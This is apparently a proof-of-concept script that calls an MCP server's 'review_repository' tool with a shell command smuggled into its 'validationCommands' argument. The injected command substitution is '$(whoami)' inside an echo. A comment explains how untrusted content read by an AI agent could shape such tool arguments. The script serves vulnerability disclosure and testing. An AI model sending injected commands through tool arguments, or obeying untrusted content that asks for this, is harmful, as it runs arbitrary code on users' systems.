import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import path from "node:path";

// same deal as repro-mcp-bug.mjs - talk to the real server like a real
// client would. point here is proving validationCommands runs *whatever*
// shell command it's handed, no restriction at all - not just "npm test"
// style commands. an ai agent's tool arguments can be shaped by untrusted
// content it read elsewhere, and this is what it'd be able to do with
// that if it got tricked into sending something malicious instead.
const repoRoot = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

const client = new Client({ name: "repro-client", version: "0.0.0" });
const transport = new StdioClientTransport({
  command: "npx",
  args: ["tsx", "src/mcp-server.ts"],
  cwd: repoRoot,
});

await client.connect(transport);

const result = await client.callTool({
  name: "review_repository",
  arguments: {
    repo_path: repoRoot,
    validationCommands: ["echo INJECTED-PROOF: $(whoami) ran arbitrary shell code via MCP"],
  },
});

console.log(result.content[0].text);

await client.close();
